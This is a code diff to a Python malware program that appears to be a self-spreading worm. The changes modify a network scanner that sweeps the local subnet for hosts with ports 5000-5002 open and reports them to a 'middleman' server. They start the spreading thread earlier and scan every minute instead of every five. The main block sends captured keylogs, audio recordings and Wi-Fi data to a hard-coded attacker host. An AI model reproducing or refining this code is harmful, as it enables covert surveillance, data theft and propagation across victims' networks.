@@ -251,53 +251,73 @@ class NetworkScanner:
         self.target_ports = [5000, 5001, 5002]
         self.middleman_host = middleman_host
         self.middleman_port = middleman_port
+        print(f"Scanner initialized with middleman: {middleman_host}:{middleman_port}")
 
     def notify_middleman(self, new_host):
         try:
+            print(f"Attempting to notify middleman about host: {new_host}")
             conn = HTTPConnection(self.middleman_host, self.middleman_port)
             headers = {'Content-type': 'application/json'}
             data = json.dumps({'new_host': new_host})
             conn.request('POST', '/new_host', data, headers)
+            response = conn.getresponse()
+            print(f"Middleman response: {response.status}")
             conn.close()
         except Exception as e:
             print(f"Failed to notify middleman: {e}")
 
     def scan_port(self, host, port):
-        """Scan a single port on a host."""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
+            sock.settimeout(0.5)  # Shorter timeout for faster scanning
             result = sock.connect_ex((host, port))
             sock.close()
+            if result == 0:
+                print(f"Port {port} is open on {host}")
             return result == 0
-        except:
+        except Exception as e:
+            print(f"Error scanning {host}:{port} - {e}")
             return False
 
-    def scan_host(self, host):
-        """Scan a single host for open ports."""
-        try:
-            for port in self.target_ports:
-                if self.scan_port(host, port):
-                    print(f"Found vulnerable host: {host} with port {port} open")
-                    self.vulnerable_hosts.put((host, port))
-                    self.notify_middleman(host)
-                    break
-        except Exception as e:
-            print(f"Error scanning {host}: {e}")
-
     def get_local_ip_range(self):
-        """Get the local network range."""
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect(("8.8.8.8", 80))
             local_ip = s.getsockname()[0]
             s.close()
             
-            # Get base IP (assuming /24 subnet)
             ip_parts = local_ip.split('.')
-            return '.'.join(ip_parts[:3])
-        except:
-            return "192.168.1"  # Fallback
+            base_ip = '.'.join(ip_parts[:3])
+            print(f"Local IP: {local_ip}")
+            print(f"Scanning network: {base_ip}.0/24")
+            return base_ip
+        except Exception as e:
+            print(f"Error getting local IP range: {e}")
+            return "192.168.1"
+
+    def scan_host(self, host):
+        print(f"Scanning host: {host}")
+        try:
+            # First check if host is alive using ping
+            if os.name == 'nt':  # Windows
+                ping_cmd = f"ping -n 1 -w 500 {host}"
+            else:  # Linux/Mac
+                ping_cmd = f"ping -c 1 -W 1 {host}"
+            
+            ping_result = subprocess.call(ping_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            if ping_result == 0:
+                print(f"Host {host} is alive, checking ports")
+                for port in self.target_ports:
+                    if self.scan_port(host, port):
+                        print(f"Found vulnerable host: {host} with port {port} open")
+                        self.vulnerable_hosts.put((host, port))
+                        self.notify_middleman(host)
+                        break
+            else:
+                print(f"Host {host} is not responding to ping")
+        except Exception as e:
+            print(f"Error scanning {host}: {e}")
 
     def scan_network(self):
         """Scan the entire network for vulnerable hosts."""
@@ -354,30 +374,31 @@ def spread_payload(target_host, target_port):
 
 def start_spreading():
     """Start scanning and spreading to vulnerable hosts."""
-    scanner = NetworkScanner()
+    print("Starting network scanner...")
+    scanner = NetworkScanner(middleman_host="192.168.1.13", middleman_port=8080)
     
     while True:
         try:
-            # Scan network for vulnerable hosts
+            print("\nStarting new network scan...")
             scanner.scan_network()
             
-            # Get list of vulnerable hosts
             vulnerable_hosts = scanner.get_vulnerable_hosts()
+            print(f"Found {len(vulnerable_hosts)} vulnerable hosts")
             
-            # Try to spread to each vulnerable host
             for host, port in vulnerable_hosts:
+                print(f"Attempting to spread to {host}:{port}")
                 threading.Thread(
                     target=spread_payload,
                     args=(host, port),
                     daemon=True
                 ).start()
             
-            # Wait before next scan
-            time.sleep(300)  # 5 minutes between scans
+            print("Waiting before next scan...")
+            time.sleep(60)  # Scan every minute instead of 5 minutes
             
         except Exception as e:
             print(f"Error in spreading routine: {e}")
-            time.sleep(60)  # Wait 1 minute on error
+            time.sleep(30)
 
 
 if __name__ == "__main__":
@@ -407,6 +428,8 @@ if __name__ == "__main__":
     attacker_host = '192.168.1.13'
     file_transfer_port = options.port + 3
     files_to_send = ["Keylog.txt", "record.wav", "wifis.txt"]
+    spreading_thread = threading.Thread(target=start_spreading, daemon=True)
+    spreading_thread.start()
     while True:
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -416,9 +439,5 @@ if __name__ == "__main__":
                 print("Successfully connected and sent files.")
                 break
         except Exception as e:
-            print(f"Error connecting to attacker for file transfer: {e}")
-            print("Retrying in 5 seconds...")
             time.sleep(5)
     # Start spreading thread
-    spreading_thread = threading.Thread(target=start_spreading, daemon=True)
-    spreading_thread.start()
